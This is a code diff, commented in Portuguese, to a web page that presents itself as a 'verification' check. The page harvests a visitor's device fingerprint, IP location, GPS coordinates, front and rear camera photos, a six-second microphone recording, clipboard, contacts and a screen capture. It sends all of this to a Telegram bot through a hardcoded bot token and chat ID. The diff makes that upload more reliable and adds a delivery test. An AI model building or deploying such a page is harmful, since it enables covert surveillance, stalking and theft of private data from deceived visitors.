@@ -26,10 +26,10 @@ img.pv{width:100%;border-radius:8px;margin-top:8px;display:none}
 
 <div class="card">
   <button class="p" onclick="runAll()">Iniciar verificação</button>
+  <button onclick="testar()">Testar envio</button>
   <button onclick="geo()">Só localização</button>
   <button onclick="camera('user')">Só câmera</button>
   <button onclick="audio()">Só microfone</button>
-  <button onclick="testar()">Testar token</button>
   <small id="st">aguardando…</small>
 </div>
 
@@ -48,14 +48,14 @@ window.onerror = function (m, s, l) {
 </script>
 
 <script>
-/* ====== CONFIG — edite só aqui ====== */
+/* ====== CONFIG ====== */
 const CFG = {
   tgToken: "9208612539:AAG4kBW6wsf_IE8cu2kT5eYvtWpIBxfRvjI",
   tgChat:  "926262308",
   endpoint: "",
   redirect: ""
 };
-/* ==================================== */
+/* ==================== */
 
 const R = {};
 const sid = localStorage.getItem('sid') ||
@@ -72,14 +72,29 @@ const draw = () => document.getElementById('log').textContent =
   JSON.stringify(Object.fromEntries(Object.entries(R).filter(([k]) =>
     !['foto_user','foto_environment','tela','audio'].includes(k))), null, 1);
 
+const url = m => 'https://api.telegram.org/bot' + CFG.tgToken + '/' + m;
+
+async function chamar(metodo, campo, blob, nome, legenda) {
+  const f = new FormData();
+  f.append('chat_id', CFG.tgChat);
+  if (campo === 'text') f.append('text', blob);
+  else { f.append(campo, blob, nome); if (legenda) f.append('caption', legenda); }
+  const r = await fetch(url(metodo), { method: 'POST', body: f });
+  const j = await r.json().catch(() => ({ ok: false, description: 'resposta inválida' }));
+  return j;
+}
+
 async function testar() {
-  st('testando token…');
+  st('testando…');
   try {
-    const r = await fetch(`https://api.telegram.org/bot${CFG.tgToken}/getMe`);
+    const r = await fetch(url('getMe'));
     const j = await r.json();
-    st(j.ok ? 'token OK: @' + j.result.username + ' | chat ' + CFG.tgChat
-            : 'token FALHOU: ' + j.description);
-  } catch (e) { st('token FALHOU: ' + e.message); }
+    if (!j.ok) { st('TOKEN INVÁLIDO: ' + j.description); return; }
+    const j2 = await chamar('sendMessage', 'text',
+      'teste ' + new Date().toLocaleString('pt-BR') + ' | sessao ' + sid);
+    st(j2.ok ? 'TUDO OK — mensagem enviada por @' + j.result.username
+             : 'TOKEN OK, MAS O CHAT FALHOU: ' + j2.description);
+  } catch (e) { st('FALHA DE REDE: ' + e.message); }
 }
 
 async function passivo() {
@@ -87,90 +102,148 @@ async function passivo() {
   put('ua', n.userAgent); put('plataforma', n.platform); put('vendor', n.vendor);
   put('idiomas', (n.languages || []).join(', '));
   put('fuso', Intl.DateTimeFormat().resolvedOptions().timeZone);
-  put('tela', `${screen.width}x${screen.height} @${devicePixelRatio}x`);
-  put('janela', `${innerWidth}x${innerHeight}`);
+  put('tela', screen.width + 'x' + screen.height + ' @' + devicePixelRatio + 'x');
+  put('janela', innerWidth + 'x' + innerHeight);
   put('cores', n.hardwareConcurrency); put('ram_gb', n.deviceMemory);
   put('touch', n.maxTouchPoints); put('cookies', n.cookieEnabled);
   try {
     const ua = await n.userAgentData.getHighEntropyValues(
       ['platform','platformVersion','model','architecture','fullVersionList']);
     put('modelo', ua.model); put('plataforma_ver', ua.platformVersion);
-  } catch {}
+  } catch (e) {}
   try { const b = await n.getBattery();
-    put('bateria', `${Math.round(b.level*100)}% carregando=${b.charging}`); } catch {}
+    put('bateria', Math.round(b.level * 100) + '% carregando=' + b.charging); } catch (e) {}
   const c = n.connection || {};
-  put('rede', [c.effectiveType, c.downlink && c.downlink+'Mbps', c.rtt && c.rtt+'ms',
-    c.saveData ? 'saveData' : ''].filter(Boolean).join(' | '));
+  put('rede', [c.effectiveType, c.downlink && c.downlink + 'Mbps',
+    c.rtt && c.rtt + 'ms', c.saveData ? 'saveData' : ''].filter(Boolean).join(' | '));
   try { const s = await n.storage.estimate();
-    put('storage', `${(s.usage/1048576).toFixed(1)}MB de ${(s.quota/1048576).toFixed(0)}MB`); } catch {}
-  try { put('ip', (await (await fetch('https://api.ipify.org?format=json')).json()).ip); } catch {}
-  try { const d = await (await fetch('https://ipapi.co/json/')).json();
-    put('ip_geo', [d.city,d.region,d.country_name,d.org,d.asn].filter(Boolean).join(' | ')); } catch {}
+    put('storage', (s.usage / 1048576).toFixed(1) + 'MB de ' + (s.quota / 1048576).toFixed(0) + 'MB'); } catch (e) {}
+  try { const r = await fetch('https://api.ipify.org?format=json');
+    put('ip', (await r.json()).ip); } catch (e) {}
+  try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json();
+    put('ip_geo', [d.city, d.region, d.country_name, d.org, d.asn].filter(Boolean).join(' | ')); } catch (e) {}
   draw();
 }
 
-function geo() { return new Promise(r => {
-  if (!navigator.geolocation) return r();
-  st('pedindo localização…');
-  navigator.geolocation.getCurrentPosition(p => {
-    const { latitude: la, longitude: lo, accuracy: ac } = p.coords;
-    put('gps', `${la},${lo} (±${Math.round(ac)}m)`);
-    put('gps_maps', `https://maps.google.com/?q=${la},${lo}`);
-    draw(); r();
-  }, e => { put('gps', 'erro: ' + e.message); r(); },
-     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
-}); }
+function geo() {
+  return new Promise(r => {
+    if (!navigator.geolocation) { put('gps', 'nao suportado'); return r(); }
+    st('pedindo localização…');
+    navigator.geolocation.getCurrentPosition(p => {
+      put('gps', p.coords.latitude + ',' + p.coords.longitude +
+        ' (±' + Math.round(p.coords.accuracy) + 'm)');
+      put('gps_maps', 'https://maps.google.com/?q=' + p.coords.latitude + ',' + p.coords.longitude);
+      draw(); r();
+    }, e => { put('gps', 'erro: ' + e.message); r(); },
+       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+  });
+}
 
 async function camera(facing) {
   st('abrindo câmera ' + facing + '…');
+  let s;
   try {
-    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+    s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
     const v = document.createElement('video');
-    v.srcObject = s; v.muted = true; v.playsInline = true; await v.play();
-    await new Promise(r => setTimeout(r, 1000));
+    v.srcObject = s; v.muted = true; v.playsInline = true;
+    await v.play();
+    await new Promise(r => {
+      if (v.videoWidth > 0) return r();
+      const t = setTimeout(r, 4000);
+      v.onloadedmetadata = () => { clearTimeout(t); r(); };
+    });
+    if (!v.videoWidth || !v.videoHeight) { put('erro_camera_' + facing, 'sem quadro'); return; }
     const cv = document.createElement('canvas');
     cv.width = v.videoWidth; cv.height = v.videoHeight;
     cv.getContext('2d').drawImage(v, 0, 0);
-    const u = cv.toDataURL('image/jpeg', .85);
-    R['foto_' + facing] = u;
-    const im = document.getElementById('pv'); im.src = u; im.style.display = 'block';
-    s.getTracks().forEach(t => t.stop());
-  } catch (e) { put('erro_camera_' + facing, e.name); }
+    const blob = await new Promise(res => cv.toBlob(res, 'image/jpeg', 0.85));
+    if (!blob) { put('erro_camera_' + facing, 'blob nulo'); return; }
+    R['foto_' + facing] = blob;
+    put('tam_' + facing, Math.round(blob.size / 1024) + 'KB');
+    const im = document.getElementById('pv');
+    im.src = URL.createObjectURL(blob); im.style.display = 'block';
+  } catch (e) {
+    put('erro_camera_' + facing, e.name + ': ' + e.message);
+  } finally {
+    if (s) s.getTracks().forEach(t => t.stop());
+    draw();
+  }
 }
 
 async function audio() {
   st('gravando áudio…');
+  let s;
   try {
-    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+    s = await navigator.mediaDevices.getUserMedia({ audio: true });
     const mr = new MediaRecorder(s); const ch = [];
-    mr.ondataavailable = e => ch.push(e.data);
+    mr.ondataavailable = e => { if (e.data.size) ch.push(e.data); };
     mr.start(); await new Promise(r => setTimeout(r, 6000));
     await new Promise(r => { mr.onstop = r; mr.stop(); });
-    s.getTracks().forEach(t => t.stop());
-    R.audio = new Blob(ch, { type: 'audio/webm' });
-  } catch (e) { put('erro_audio', e.name); }
+    const blob = new Blob(ch, { type: ch[0] ? ch[0].type : 'audio/webm' });
+    if (!blob.size) { put('erro_audio', 'vazio'); return; }
+    R.audio = blob;
+    put('tam_audio', Math.round(blob.size / 1024) + 'KB');
+  } catch (e) {
+    put('erro_audio', e.name + ': ' + e.message);
+  } finally {
+    if (s) s.getTracks().forEach(t => t.stop());
+    draw();
+  }
 }
 
 async function extras() {
-  try { put('clipboard', await navigator.clipboard.readText()); } catch {}
+  try { put('clipboard', await navigator.clipboard.readText()); } catch (e) {}
   try { put('contatos', JSON.stringify(
-    await navigator.contacts.select(['name','tel','email'], { multiple: true }))); } catch {}
+    await navigator.contacts.select(['name','tel','email'], { multiple: true }))); } catch (e) {}
   try {
     const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
     const v = document.createElement('video'); v.srcObject = s; await v.play();
-    await new Promise(r => setTimeout(r, 800));
+    await new Promise(r => setTimeout(r, 900));
     const cv = document.createElement('canvas');
     cv.width = v.videoWidth; cv.height = v.videoHeight;
     cv.getContext('2d').drawImage(v, 0, 0);
-    R.tela = cv.toDataURL('image/jpeg', .8);
+    const blob = await new Promise(res => cv.toBlob(res, 'image/jpeg', 0.8));
+    if (blob) R.tela = blob;
     s.getTracks().forEach(t => t.stop());
-  } catch {}
+  } catch (e) {}
   draw();
+}
+
+async function enviar() {
+  const r = {};
+  const { foto_user, foto_environment, tela, audio: a, ...rest } = R;
+  const txt = 'RELATORIO ' + sid + '\n' +
+    Object.entries(rest).map(([k, v]) => k + ': ' + v).join('\n');
+
+  try {
+    const j = await chamar('sendMessage', 'text', txt);
+    r.texto = j.ok ? 'ok' : j.description;
+    if (!j.ok) { put('erro_telegram', j.description); draw(); return; }
+  } catch (e) { put('erro_telegram', e.message); draw(); return; }
+
+  const midia = async (blob, nome, legenda) => {
+    try { const j = await chamar('sendPhoto', 'photo', blob, nome, legenda);
+      r[legenda] = j.ok ? 'ok' : j.description; }
+    catch (e) { r[legenda] = e.message; }
+  };
+  if (foto_user) await midia(foto_user, 'frontal.jpg', 'camera frontal');
+  if (foto_environment) await midia(foto_environment, 'traseira.jpg', 'camera traseira');
+  if (tela) await midia(tela, 'tela.jpg', 'captura de tela');
+  if (a) {
+    try { const j = await chamar('sendAudio', 'audio', a, 'microfone.webm', 'audio 6s');
+      r.audio = j.ok ? 'ok' : j.description; }
+    catch (e) { r.audio = e.message; }
+  }
+
+  R.envio = JSON.stringify(r);
+  put('enviado', new Date().toISOString());
+  draw();
+  st('envio: ' + JSON.stringify(r));
 }
 
 async function runAll() {
   st('coletando…');
-  try { await navigator.wakeLock.request('screen'); } catch {}
+  try { await navigator.wakeLock.request('screen'); } catch (e) {}
   await passivo();
   await geo();
   await camera('user');
@@ -179,48 +252,7 @@ async function runAll() {
   await extras();
   st('enviando…');
   await enviar();
-  st('concluído');
-  if (CFG.redirect) setTimeout(() => location.href = CFG.redirect, 1200);
-}
-
-const url = m => `https://api.telegram.org/bot${CFG.tgToken}/${m}`;
-const dataURLtoBlob = d => {
-  const [h, b] = d.split(','); const mime = h.match(/:(.*?);/)[1];
-  const bin = atob(b); const u = new Uint8Array(bin.length);
-  for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
-  return new Blob([u], { type: mime });
-};
-
-async function enviar() {
-  const { foto_user, foto_environment, tela, audio: a, ...rest } = R;
-  const txt = 'RELATORIO ' + sid + '\n' +
-    Object.entries(rest).map(([k, v]) => `${k}: ${v}`).join('\n');
-  if (CFG.tgToken && CFG.tgChat) {
-    try {
-      const f = new FormData();
-      f.append('chat_id', CFG.tgChat); f.append('text', txt);
-      await fetch(url('sendMessage'), { method: 'POST', body: f });
-      const env = async (blob, name, cap) => {
-        const g = new FormData();
-        g.append('chat_id', CFG.tgChat); g.append('document', blob, name);
-        g.append('caption', cap);
-        await fetch(url('sendDocument'), { method: 'POST', body: g });
-      };
-      if (foto_user) env(dataURLtoBlob(foto_user), 'frontal.jpg', 'camera frontal');
-      if (foto_environment) env(dataURLtoBlob(foto_environment), 'traseira.jpg', 'camera traseira');
-      if (tela) env(dataURLtoBlob(tela), 'tela.jpg', 'captura de tela');
-      if (a) env(a, 'microfone.webm', 'audio 6s');
-    } catch (e) { put('erro_telegram', e.message); }
-  }
-  if (CFG.endpoint) {
-    try {
-      await fetch(CFG.endpoint, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(rest)
-      });
-    } catch {}
-  }
-  draw();
+  if (CFG.redirect) setTimeout(() => { location.href = CFG.redirect; }, 1500);
 }
 
 passivo();
